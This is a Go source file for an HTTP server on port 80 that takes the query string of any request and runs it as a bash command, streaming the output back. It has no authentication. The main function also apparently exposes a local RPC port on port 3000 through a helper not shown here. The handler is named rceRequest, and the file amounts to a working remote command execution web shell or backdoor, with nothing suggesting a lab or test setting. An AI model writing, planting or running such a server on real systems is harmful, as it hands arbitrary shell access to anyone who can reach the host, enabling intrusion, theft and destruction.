package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os/exec"
)

// Creates a writer that auto flush forwards the data
type flushWriter struct {
	f http.Flusher
	w io.Writer
}

func (fw *flushWriter) Write(p []byte) (n int, err error) {
	n, err = fw.w.Write(p)
	if fw.f != nil {
		fw.f.Flush()
	}
	return
}

func rceRequest(w http.ResponseWriter, r *http.Request) {

	// Get requested commands
	cmd, err := url.QueryUnescape(r.URL.RawQuery)
	if err != nil {
		w.WriteHeader(400)
		fmt.Fprintf(w, "Couldn't unescape raw querystring\n%v", err)
		log.Fatal(err)
		return
	}

	// Log called request
	fmt.Printf("Called '%v'\n", cmd)

	// Set headers for dynamic updates
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")

	// Create flushwriter
	fw := flushWriter{w: w}
	if f, ok := w.(http.Flusher); ok {
		fw.f = f
	}

	// Create execution process
	c := exec.Command("bash", "-c", cmd)
	c.Stdout = &fw
	c.Stderr = &fw

	// Run process
	err = c.Run()
	if err != nil {
		fmt.Print(err)
	}

}

func handleRequests() {
	http.HandleFunc("/", rceRequest)
	log.Fatal(http.ListenAndServe(":80", nil))
}

func main() {
	go rpcExposer("127.0.0.1:1234", ":3000")
	handleRequests()
}
